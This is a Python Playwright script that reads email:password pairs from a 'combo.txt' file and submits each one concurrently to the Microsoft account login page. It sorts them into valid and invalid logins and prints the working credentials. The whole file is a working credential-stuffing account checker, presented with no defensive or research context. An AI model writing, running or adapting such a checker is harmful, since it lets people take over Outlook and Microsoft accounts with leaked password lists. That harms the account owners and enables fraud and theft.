import asyncio
from playwright.async_api import async_playwright

async def login_outlook(email, password):
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context()
            page = await context.new_page()

            print(f"[*] Checking {email}...")

            await page.goto("https://login.live.com/")
            await page.fill('input[type="email"]', email)
            await page.click('input[type="submit"]')

            await page.wait_for_timeout(2000)
            await page.fill('input[type="password"]', password)
            await page.click('input[type="submit"]')

            await page.wait_for_timeout(5000)

            content = await page.content()

            if "login.live.com" not in page.url:
                print(f"[VALID] {email}:{password}")
                print(f"[RESPONSE URL] {page.url}")
            else:
                print(f"[INVALID] {email}:{password}")
                if "error" in content.lower() or "problem" in content.lower():
                    print(f"[INFO] Error message found in page content.")
                else:
                    print(f"[INFO] Login failed, but no error message visible.")

            await browser.close()
    except Exception as e:
        print(f"[ERROR] {email}:{password} -> {str(e)}")

async def main():
    tasks = []
    with open("combo.txt", "r") as f:
        for line in f:
            if ':' in line:
                email, password = line.strip().split(":", 1)
                tasks.append(login_outlook(email, password))
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
